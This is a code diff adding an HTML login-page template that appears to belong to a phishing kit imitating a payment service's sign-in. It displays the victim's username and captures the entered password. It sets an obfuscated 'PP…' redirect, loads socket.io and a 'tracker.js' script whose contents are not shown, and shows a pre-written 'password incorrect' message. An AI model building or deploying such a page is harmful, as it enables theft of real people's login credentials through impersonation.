@@ -1,0 +1,100 @@
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/index.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+</head>
+
+<body>
+    <header>
+
+    </header>
+    <main>
+        <form method="post" id="pass">
+            <div class="logo">
+                <img src="img/pipillgomark.png" alt="">
+            </div>
+            <div class="change">
+                <p>
+                    <%=user%>
+                </p>
+                <a href="/">Change</a>
+            </div>
+            <div class="input-container">
+                <input required="" id="password" name="password" type="password">
+                <label class="label" for="password">Password</label>
+                <div class="underline"></div>
+                <div id="errorMessage" style="color: #ff0000; font-size: 14px; margin-top: 10px; text-align: center;">
+                    The entered password is incorrect. Please try again.</div>
+            </div>
+            <div class="bot">
+                <div class="first">
+                    <p>Forgot Password?</p>
+                    <button class="btn" type="submit">Continue</button>
+                </div>
+                <div class="mid">
+                    <hr>
+                    <span>or</span>
+                    <hr>
+                </div>
+                <div class="second">
+                    <a href="">Sign up</a>
+                </div>
+                <div class="third">
+                    <a href="">Arabic</a>
+                    <hr>
+                    <a href="" class="active">English</a>
+                    <hr>
+                    <a href="">French</a>
+                    <hr>
+                    <a href="">Spanish</a>
+                    <hr>
+                    <a href="">Chinese</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    <footer>
+        <p>Contact</p>
+        <p>Privacy Policy</p>
+        <p>Legal</p>
+        <p>Policy Updates</p>
+        <p>Worldwide</p>
+    </footer>
+
+    <script>
+        document.getElementById('pass').addEventListener('submit', function (e) {
+            e.preventDefault();
+            console.log("submit");
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            if (!password.trim()) {
+                // Show error message if password is empty
+                errorMessage.textContent = 'Please enter your password.';
+                errorMessage.style.display = 'block';
+                return; // Stop form submission
+            }
+
+            console.log('Login attempt:', { password });
+
+            const form = document.getElementById('pass');
+            form.setAttribute('data-redirect', '/loadPPxCvGk6Hb?time=12&url=PPxSmSxhkjnUHnKJHu');
+        });
+
+        // Also hide error message when user starts typing
+        document.getElementById('password').addEventListener('input', function () {
+            const errorMessage = document.getElementById('errorMessage');
+            errorMessage.style.display = 'none';
+        });
+    </script>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/tracker.js"></script>
+
+</body>
+
+</html>
